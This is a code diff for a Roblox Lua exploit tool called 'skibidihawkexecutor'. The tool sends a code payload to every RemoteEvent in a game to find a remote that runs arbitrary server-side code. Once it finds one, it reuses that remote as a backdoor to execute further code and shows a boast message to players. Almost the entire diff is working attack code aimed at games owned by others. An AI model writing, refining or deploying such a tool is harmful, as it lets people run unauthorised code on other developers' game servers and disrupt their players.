@@ -50,9 +50,30 @@ for _, obj in ipairs(workspace:GetDescendants()) do
 	end
 end
 
-workspace.DescendantAdded:Connect(function(obj)
-	if obj.Name == "skibidihawkexecutormodel" and lastFiredRemote then
+workspace.DescendantAdded:Connect(function(item)
+	if item.Name == "skibidihawkexecutormodel" and lastFiredRemote then
 		backdoor = lastFiredRemote
+	end
+end)
+
+button.MouseButton1Click:Connect(function()
+	local startTime = tick()
+	local code = [[
+		Instance.new("Model", workspace).Name = "skibidihawkexecutormodel"
+	]]
+
+	for _, event in ipairs(game.ReplicatedStorage:GetDescendants()) do
+		if event:IsA("RemoteEvent") then
+			lastFiredRemote = event
+			event:FireServer(code)
+			game:GetService("RunService").RenderStepped:Wait()
+		end
+	end
+
+	wait(0.5) -- short delay to allow DescendantAdded to fire
+
+	if backdoor then
+		local totalTime = math.floor((tick() - startTime) * 100) / 100
 		button:Destroy()
 
 		local scroll = Instance.new("ScrollingFrame", frame)
@@ -96,22 +117,27 @@ workspace.DescendantAdded:Connect(function(obj)
 				backdoor:FireServer(codetorun)
 			end
 		end)
-	end
-end)
 
-button.MouseButton1Click:Connect(function()
-	local code = [[
-		Instance.new("Model", workspace).Name = "skibidihawkexecutormodel"
-	]]
-	for _, event in ipairs(game.ReplicatedStorage:GetDescendants()) do
-		if event:IsA("RemoteEvent") then
-			lastFiredRemote = event
-			event:FireServer(code)
-			game:GetService("RunService").RenderStepped:Wait()
-			if workspace:FindFirstChild("skibidihawkexecutormodel") then
-				backdoor = event
-				break
-			end
-		end
+		local successCode = [[
+			local hint = Instance.new("Hint", workspace)
+			hint.Text = "Backdoor detected by skibidihawkexecutor — best backdoor scanner 😎😎"
+			delay(5, function()
+				hint:Destroy()
+			end)
+		]]
+
+		backdoor:FireServer(successCode)
+
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "skibidihawkexecutor",
+			Text = "Found backdoor in " .. totalTime .. " seconds 😎",
+			Duration = 5
+		})
+	else
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = "skibidihawkexecutor",
+			Text = "No backdoor found :c",
+			Duration = 5
+		})
 	end
 end)
